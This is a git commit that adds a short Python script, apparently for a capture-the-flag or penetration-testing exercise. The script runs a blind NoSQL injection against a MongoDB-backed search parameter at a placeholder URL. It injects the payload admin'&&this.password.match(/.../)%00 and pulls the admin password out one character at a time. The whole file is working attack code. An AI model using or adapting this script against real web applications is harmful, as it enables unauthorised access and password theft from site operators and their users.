73b74302e8c9341e57d22a7209654b62244fe99d
redhoodie09 <53815409+redhoodie09@users.noreply.github.com>
2021-02-13 18:15:46 +1100

    Create mongodb.py

---
+++ Bruteforce/mongodb.py
@@ -0,0 +1,26 @@
+import urllib.request
+import string
+
+URL = "http://example-url.com"
+
+def check(payload):
+    url=URL+"/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
+    print(url)
+    resp = urllib.request.urlopen(url)
+    data = resp.read()
+    return ">admin<" in str(data)
+
+CHARSET = list ("-" + string.ascii_lowercase + string.digits)
+password = ""
+
+while True:
+    for c in CHARSET:
+        print("Trying: "+c+" for " + password)
+        test = password + c
+        if check("^"+test+".*$"):
+            password += c
+            print (password)
+            break
+        elif c == CHARSET[-1]:
+            print (password)
+            exit(0)
